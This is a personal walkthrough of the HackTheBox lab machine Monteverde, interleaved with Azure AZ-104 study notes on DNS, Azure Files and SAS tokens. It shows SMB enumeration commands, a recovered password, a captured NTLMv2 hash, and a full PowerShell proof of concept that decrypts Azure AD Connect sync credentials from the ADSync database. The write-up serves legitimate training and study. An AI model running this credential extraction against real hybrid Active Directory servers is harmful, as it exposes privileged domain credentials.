# Monteverde Helped-Through


Name: Monteverde
Date:  12/3/2023
Difficulty:  Medium
Goals:  
- Counter failure of Az 104 with more Az 104, but make it HTB
- Take another Microsoft assessment afterwards
Learnt:
- I need to do the THM intro to cryptography to bush up on my understanding about cryptography
- Azure DNS is alot clearer
- PowerUPSQL for MSSQL auditing
- Security Onion 
Beyond Root:
- AZ-104 failure -> push to pass in the next two weeks:  
	- Per section two AZ exam like questions that I need to work that are relevant to this box
	- Recontextualise this box as it were in Cloud 

- Backups and Storage accounts 
- IP ranges and NSGs and VNet rules
- Azure DNS and custom DNS
- DevOps and App Services

Before resitting

[PSADPasswordCredential Class (Microsoft.Azure.Commands.ActiveDirectory) | Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/microsoft.azure.commands.activedirectory.psadpasswordcredential?view=az-ps-6)
[Log on as a batch job (Windows 10) | Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/log-on-as-a-batch-job)
[Plan for IP addressing - Cloud Adoption Framework | Microsoft Learn](https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/ready/azure-best-practices/plan-for-ip-addressing)
[Azure DNS documentation | Microsoft Learn](https://learn.microsoft.com/en-us/azure/dns/)

I tried, but failed first time for my AZ-104. 610 out 1000, needed only 90 points to pass. It was my first proctored exam. I had trouble concentrating, but did better in terms on remain concious of the fundementals of networking, AD and cloud related actual requirements as to the questions that you are posed. Due to it being an entire week off work no being able to do any real hacking I need a win and something fun. I have done alot revision and good few tests, but I think I can pass it next time, I did practice test the day before and was 400ish points. So 200 more  over the next week of doing an hour of practical, recall and response over the exam requirements and one Microsoft assessment a day.  

I definately need a positive spin to fling metaphorical upwards as I have had to watch the new HTB season slip away from that inital bandwagon. I have to get up to start work a 5am tomorrow with a long next week ahead. I would have really liked to pass and move another step forward.

Regardless I am going to back to this machine that I discovered was Azure after looking for AD boxes to try for OSCP. From what I can tell I had done some SMB, LDAP recon and got the usernames. I also think it was around this time I did the FFUF HTB academy as the issue would have been subdomains possible a wordlist issue.. that chessnut of issues. I am going to follow along with Ippsec following up with Howard from IT Security, while I make this about AZ 104. 

[Ippsec's Video](https://www.youtube.com/watch?v=HTJjPZvOtJ4) and [I.T Security Labs](https://www.youtube.com/watch?v=YLScV9TM64E)

## Recon

From what Ippsec tells us it is it does not have a Web server. So actually this is really cruel of fate itself as Azure has an additional DNS record. `A Alias` record that is use to resolve domains in Azure. DNS seems for some reason to be such a kick in the preverbals for me. I am als unsure as to why. DNS Recon seems like using string to pull a tiny key through a lock to then have to make sense of what that key could be for, if it does not just domain transfer.

Ippsec discuss AD Connect, which as requires PasswordWriteBack which I know is a way of synchronizing between On-Premise AD and Azure AD. The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.

![ping](HackTheBox/Retired-Machines/Monteverde/Screenshots/ping.png)

In fairnesss and kindness to myself from last year one of the nasty curves with HTB or PG or THM at some point is the requirement that preparing for OSCP mean remain relevant to something OSCP-like and the rabbit-holing of time of exploring new technologies. OSCP is not a cloud based Cert. Someone this box in a OSCP-like list because muh-AD, but it really is not its Azure AD Connected to On-premise AD. And ultimately part of the issue is that boxes are to be solved, but not ever knowing a technology - yes researching and RTFM, but is itself a rabbithole. One of the best pieces of advice that came from Offsec or HakLuke was go pillage every single OSCP cheatsheet and use some them I found so much that would have taken along time to acquire from videos. Especially technologies, they become much less grindy and intimidating in a scheduling sense once you have the look for these things, here some important information about Wordpress or Filetransfers go!

The reason why Ippsec can not find the hostname is whether in modern Azure if this is either custom DNS or Azure DNS if the latter with record aliasing.

#### Azure DNS 

[Azure DNS](https://learn.microsoft.com/en-us/azure/dns/dns-overview) *"is a hosting service for DNS domains that provides name resolution by using Microsoft Azure infrastructure."*  Azure can manage all your DNS or you can using the all the features other Azureservices.. 
- It does not support DNSSEC
- Customizable Vnet with Private domains

Having never managed a DNS server and looking into here and there especially from the [[Kotarak-Helped-Through]] - beyond root of making a DNS server andI once required a Rogue DNS server at some point for another box. From what I have read and can assume seems like a good idea from the point on study the AZ-104 that is much easier to manage. No record management without some kind of versioning like `git` for software seems like a nightmare especially from what I understand that incorrect record keeping and can then expose domain that are suppose be in some network perimeter and not accessible by the public internet.

[Overview of Azure DNS alias records](https://learn.microsoft.com/en-us/azure/dns/dns-alias) are qualifications on a DNS record set. They reference Azure resources from a DNS zone in Azure. An alias record set is supported for the following record types in an Azure DNS zone:
- A, AAAA, CNAME
- [Create A Alias Record](https://learn.microsoft.com/en-us/azure/dns/tutorial-alias-rr):
- `Search DNS Zone -> $DNSzone -> + Record Set -> Add record set (Name, Type,, Alias record set (Yes I No), Alias Type (Azure resource | Zone record set)` referencing either a set or resource

Azure Public DNS - [Host your domain in Azure DNS](https://learn.microsoft.com/en-us/azure/dns/dns-delegate-domain-azure-dns)
- `Search DNS Zones -> Create`
- If it is a child of an existing zone already hosted in Azure DNS 
	- `Tick, providing Name and Resource Group Location`
- [Delegate your DNS zone](https://learn.microsoft.com/en-us/azure/dns/dns-delegate-domain-azure-dns) to Azure DNS
	1. Get name servers for your zone
	2. `Search DNS Zones -> $DNSzone -> Overview -> ..name servers listed..`
	3. Update parent domain with `Azure DNS name servers` - each registar with its own DNS tools
- [Child Zones](https://learn.microsoft.com/en-us/azure/dns/tutorial-public-dns-zones-child)
	- `Search -> DNS Zones -> $DNSzone -> + Child zone`

[Azure DNS for private domains](https://learn.microsoft.com/en-us/azure/dns/private-dns-overview) for Custom DNS requires:
- Vnet (With Resource Manager deployment model) and Subnet,
- Add Virtual Network Linking: `Resource groups -> $resourceGroup -> $domain -> select Virtual Network Links` - provide VNet, Sub and a `Link name`  
- Create an additional DNS Record in the correct DNS Zone	

Azure DNS Private Resolver - required RG and VNet - no VM based DNS servers
- Sub, RG, Name, Region and VNet
`Search -> Private DNS Resolver` 
- provide the required Project Details 
- For `Inbound Endpoints` and `Outbound Endpoints` require both a name and separate subnet 
- `Ruleset` - `+ Add rules` to Domain name resolution requests that match will be forwarded to the IP addresses  specified through the endpoint selected

Azure Traffic Manager for the Network Watcher can be used the diagnose issues with Azure DNS. 
[Creating an Alias Record to support apex domains](https://learn.microsoft.com/en-us/azure/dns/tutorial-alias-tm) 
- Add DNS label from  `Search -> Public IP addresses -> $resource -> Configuration -> DNS name label & Save`
- Create a traffic manager profile: `Search -> Traffic Manager profile` - consider routing method
- Add endpoint `$TMprofile -> Endpoints`
- Create an Alias Record that points to the Traffic Manager profile: `$DNSzone and + Rescord set` 

#### Back to the hacking

DNS recon - not done this in a while
```bash
nslookup
> server 10.129.228.111
> 127.0.0.1
> megabank.local
```

Output:
![](dnsrecon.png)

No domain transfer
![](nodomaintransfer.png)

#### IP address planning 

At this point is prudent of me to discuss IP ranges in Azure and IP address planning. There can be no IP address overlap across Cloud hosted and on-premise. [See More](https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/ready/azure-best-practices/plan-for-ip-addressing)

#### Back to the Hacking

RPC null auth is common for gRPC application communications.
![](rpcnullauth.png)

```bash
echo "" | awk -F: '{print $2}' | tr -d '[]' | awk '{print $1}' > users.txt
```

![](cmepasspol.png)

One thing that is considered abit old, but still useful is enum4linux; Group memeber from enum4linux
![](elgroupmembers.png)

SABatchJobs = SABatchJobs! 
![](cmeSAbatchJobs.png)
Mitigation is long strong, automated password rotation and access control to this account its RBAC in Azure and locally. [SABatchJobs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/log-on-as-a-batch-job) can perform a Administrator-like functions for batch-queue tools such as the Task Scheduler service.

#### back to CME --shares

SABatchJobs
![](cmesmbsharessabatchjob.png)

Azure Uploads.. This is a great time to discuss smb in the cloud with:...

##### Azure Files

[Azure Files](https://learn.microsoft.com/en-us/azure/storage/files/storage-files-introduction) is cloud base file sharing it microsfot response the weaknesses File Shares connected to VMs, access control, management of Shares that get populated be users and APTs alike..

[Introduction to Azure Files | Microsoft Learn](https://learn.microsoft.com/en-us/azure/storage/files/storage-files-introduction): *"Azure Files offers fully managed file shares in the cloud that are accessible via the industry standard [Server Message Block (SMB) protocol](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview), [Network File System (NFS) protocol](https://en.wikipedia.org/wiki/Network_File_System), and [Azure Files REST API](https://learn.microsoft.com/en-us/rest/api/storageservices/file-service-rest-api)."*

Storage Resources are group in Storage Accounts.

VM will still require 445 to be allowed at the NIC NSG level

File Share IAM - Access Control
`$fileshare -> IAM`

Unlike in physical network like this which would be mounted onto the box. [Documentation to create Azure Files](https://learn.microsoft.com/en-us/azure/storage/files/storage-how-to-use-files-portal?tabs=azure-portal).  Azure file sync is useful for maintain File shares and the use case provided by the course using the sync to cleaning up temporary files. 

[Quickstart for creating and using Azure file shares | Microsoft Learn](https://learn.microsoft.com/en-us/azure/storage/files/storage-how-to-use-files-portal?tabs=azure-portal)

Azure File Sync 
- Only for:
	- Standard file shares (GPv2), LRS/ZRS
	- Standard file shares (GPv2), GRS/GZRS
	- Premium file shares (FileStorage), LRS/ZRS

#### Back to the CME modules

Just because why not, CME has modules that make AD enumeration alot easier
![](cmemodulesveryimportant.png)
CME has share spidering
![](spideringplus.png)

Recursive SMBmap 
```bash
# Recursively list dirs, files 
smbmap -H 10.129.228.111 -R --exclude SYSVOL,IPC$
# Recursive list contents of directory
smbmap -u SABatchJobs -p SABatchJobs -H 10.129.228.111 -r --exclude SYSVOL,IPC$
```

![](xmlazure.png)

More smbmap
```bash
smbmap -H 10.129.228.111 -u SABatchJobs -p SABatchJobs --download user$/mhope/azure.xml
```

Never used this feature of smbmap, mostly because I wanted to be more OPsec safe and stealthy to use Smbclient.
![](xmlazuresmbmapcandownload.png)

## Exploit

Cat the xml for a password.
![](anotherdayanotherdollar.png)

```
4n0therD4y@n0th3r$
```

#### Azure Credentials

SAS Tokens - here is rather lacks memory test:
```json
sv signature version
ss start
se expiration
srt resource type
2 more...
resource, perms and sig

# REQUIRED
?sv= # Signed version - signature version! 
&st # Start Time
&se # Expiration Time
&sr # Storage Resource - b for blob, q for queue 
&sp # permissions  r, wr
&sig # SHA256 hash - the signature
```

#### Back to hacking

![](mhopepassword.png)

![](mhopepwned.png)

## Foothold

One concerning thing from a OSCP prep perspective that I note most for myself is that really the first thing Ippsec really should be doing:
1. AV checks
2. Box information and its purpose
	1. You can find box information at level that are not cli like reg and file/directory properties - from talk: [find]
3. Database and configuration files with credentials
4. Lay of the land
5. Then scripts... APTs most like not use enumeration scripts for lots of reasons, but they are useful in Pentesting and Blueteaming. They are built from the checks done by attackers over many, many months.

This video Ippsec does a great job of explain that trying different scripts are good, but script should be more a summary that occurs after, why?:
- OPSec generally
- Alerts, AV, etc
- You need a understandable mapping of the box - scripts give too much information
- Locard principle and the touching memory/disks
- Packet economy 

Also machines are not like your Kali, Pwnbox or Attackbox in real world environments the idea is to seperate workload for compute and maintaince. So for OSCP know the default layout and the thing that is added to the box  in a CTF is probably the(or one of the) ways. One of the hardest OSCP lessons is moving to this hyperorganized list-to-graph based patience set of TODO mappings rather than combing and testing and playing - bug hunting mentality.  

#### Trying PowerUPSQL

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is A PowerShell Toolkit for Attacking SQL Server
[PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) has its own handy cheatsheet.

Seems pretty awesome!
![](sqlaudit.png)

We can steal NTLM hashes with responder
![1080](coolresponse.png)

```python
[SMB] NTLMv2-SSP Client   : 10.129.241.98
[SMB] NTLMv2-SSP Username : MEGABANK\MONTEVERDE$
[SMB] NTLMv2-SSP Hash     : MONTEVERDE$::MEGABANK:3136142a87b8da1d:D8E9C23E9C304FEFD8A31D47142C07EE:01010000000000008077C92EE455D901FB8C65361F5A2193000000000200080048004B004C004B0001001E00570049004E002D004E00500037003000350034005A004E0036003700350004003400570049004E002D004E00500037003000350034005A004E003600370035002E0048004B004C004B002E004C004F00430041004C000300140048004B004C004B002E004C004F00430041004C000500140048004B004C004B002E004C004F00430041004C00070008008077C92EE455D90106000400020000000800300030000000000000000000000000300000CD55D6B05ED1E2EFAEB97A8BB9CB0B6748E6246566804901CE23FE0EE4E53ED50A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100300036000000000000000000
```

## PrivEsc

[PSADPassword Credentials](https://learn.microsoft.com/en-us/dotnet/api/microsoft.azure.commands.activedirectory.psadpasswordcredential?view=az-ps-6)

Adam Chester's Blog on Azure Privilege Escalation [Azure AD Connect for Red Teamers](https://blog.xpnsec.com/azuread-connect-for-redteam/)

TIL; Azure AD Connect is Hybrid Cloud an some organisation want the same passwords for account on and off premises. Synchronization occur between the Cloud and On-Premise where if an attack can reach the server that synchronizes between Azure and Organization credential can be decrypted as that seerver will host decrypt.dll

```sql
SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'
```

```powershell
sqlcmd -q "Use ADSync; SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
```

![](thxadamchester.png)

```css
MEGABANK.LOCAL 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g
```

[Follow XPN](https://gist.githubusercontent.com/xpn/0dc393e944d8733e3c63023968583545/raw/d45633c954ee3d40be1bff82648750f516cd3b80/azuread_decrypt_msol.ps1)
```cs
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

At this point I began reading [MS Connect PTA security](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta-security-deep-dive) as hey that might be useful to know and passwords are still a thing and may of the attack paths that I had ideas about that seemed similar to things I have learnt from THM, HTB, OSCP and OS-PG and everything else I never seem to touch on passwords while going through AZ - 104. I then though I would take a look at [Howard from I.T. Security Labs](https://www.youtube.com/watch?v=YLScV9TM64E) as Ippsec is then debugging someelse code and I did not think I need to learn that much from that, also there are other PoCs. Howard an awesome take on this box by using CTI and Blue team tools to follow allow with the full attack path to do some Threat hunting. He demos [Security Onion](https://github.com/Security-Onion-Solutions/securityonion), which I had never heard of and Elastic.

[Security Onion](https://github.com/Security-Onion-Solutions/securityonion) *"Security Onion is a free and open platform for threat hunting, enterprise security monitoring, and log management. It includes our own interfaces for alerting, dashboards, hunting, PCAP, and case management. It also includes other tools such as Playbook, osquery, CyberChef, Elasticsearch, Logstash, Kibana, Suricata, and Zeek."*

Use metasploit for auxilliary smb_login to brute force the SMB share. He then directs attention to the [vbscrub blog](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/), which references a talk by [Dirk jan](https://www.youtube.com/watch?v=JEIR5oGCwdg), who wrote the remote [python bloodhound](https://github.com/dirkjanm) 

We need to run [VbScrub's tool](https://github.com/VbScrub/AdSyncDecrypt) from the binary directory from Microsoft Azure AD sync to then use the use the MSSQL for the password and decrypt it all local, as it is HTB.
![](root.png)
And 
![](azureadminpass.png)

## Beyond Root

Hardening the Azure with [MS Connect PTA security](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta-security-deep-dive) also thought about while cleaning up would it not just be cool to try arbituarly write data to disk over all locations of where the ADDecrypt.zip, ADDecrypt and its contents are stored as data for OS record keeping and the disk and how as DFIR would you counter that if you could hold any VMs or Live system in a suspended state or have a holographic file system where there is session layer of previous session and current session for dynamic analysis in Malware Analysis. 


Discuss in [[PhotoBomb-Helped-Through]]
- Update and fault domain 
- Host Photobomb as an app service plan and discuss context 
- Application Proxy and use case in Photobomb
- Configure DNS for multiple vnets to host photobomb internally
- -EnableLargeFileShare research


